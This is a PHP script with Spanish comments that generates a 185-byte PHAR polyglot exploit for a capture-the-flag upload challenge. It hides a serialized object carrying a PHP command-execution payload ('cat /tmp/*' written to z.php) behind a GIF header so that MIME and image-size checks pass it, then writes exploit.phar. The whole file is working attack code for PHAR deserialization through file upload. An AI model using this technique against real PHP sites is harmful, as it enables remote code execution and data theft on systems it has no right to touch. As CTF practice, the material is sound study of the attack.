<?php
/**
 * Generador de PHAR polyglot de 185 bytes exactos
 * Para el reto Meme Upload Service de 247CTF
 *
 * Uso: php -d phar.readonly=0 generate_phar_185.php
 * Output: exploit.phar (185 bytes)
 */

class Message {
    public $to;
    public $filePath;
}

$m = new Message;
$m->filePath = "z.php";
$m->to = "<?=`cat /tmp/*`?>";
$metadata = serialize($m);

// Stub con magic bytes GIF para pasar mime_content_type y getimagesize
$stub = "GIF8__HALT_COMPILER(); ?>\r\n";

// Archivo interno minimo (requerido por PHAR)
$filename = "0";
$filecontent = "";

// Construir manifest
$manifest = "";
$manifest .= pack("V", 1);                    // Numero de archivos: 1
$manifest .= pack("v", 0x0011);               // Version API
$manifest .= pack("V", 0x00010000);           // Flags: tiene firma
$manifest .= pack("V", 0);                    // Longitud alias: 0
$manifest .= pack("V", strlen($metadata));    // Longitud metadata
$manifest .= $metadata;                       // Metadata serializada

// Entrada de archivo
$manifest .= pack("V", strlen($filename));    // Longitud nombre
$manifest .= $filename;                       // Nombre del archivo
$manifest .= pack("V", strlen($filecontent)); // Tamano sin comprimir
$manifest .= pack("V", 0);                    // Timestamp
$manifest .= pack("V", strlen($filecontent)); // Tamano comprimido
$manifest .= pack("V", crc32($filecontent));  // CRC32
$manifest .= pack("V", 0x000001A4);           // Flags (permisos)
$manifest .= pack("V", 0);                    // Longitud metadata por archivo

// Ensamblar PHAR
$phar_data = $stub;
$phar_data .= pack("V", strlen($manifest));   // Longitud del manifest
$phar_data .= $manifest;
$phar_data .= $filecontent;

// Agregar firma SHA1
$sig_data = hash("sha1", $phar_data, true);   // 20 bytes
$phar_data .= $sig_data;
$phar_data .= pack("V", 0x0002);              // Tipo de firma: SHA1
$phar_data .= "GBMB";                         // Magic de PHAR

// Guardar archivo
file_put_contents("exploit.phar", $phar_data);

echo "=== PHAR Polyglot Generado ===\n";
echo "Archivo: exploit.phar\n";
echo "Tamano: " . strlen($phar_data) . " bytes\n";
echo "Limite: 185 bytes\n";
echo "\n=== Validacion ===\n";
echo "MIME: " . mime_content_type("exploit.phar") . "\n";
$img = @getimagesize("exploit.phar");
echo "getimagesize: " . ($img !== false ? "valido ({$img[0]}x{$img[1]})" : "INVALIDO") . "\n";

echo "\n=== Metadata serializada ===\n";
echo $metadata . "\n";
echo "(" . strlen($metadata) . " bytes)\n";
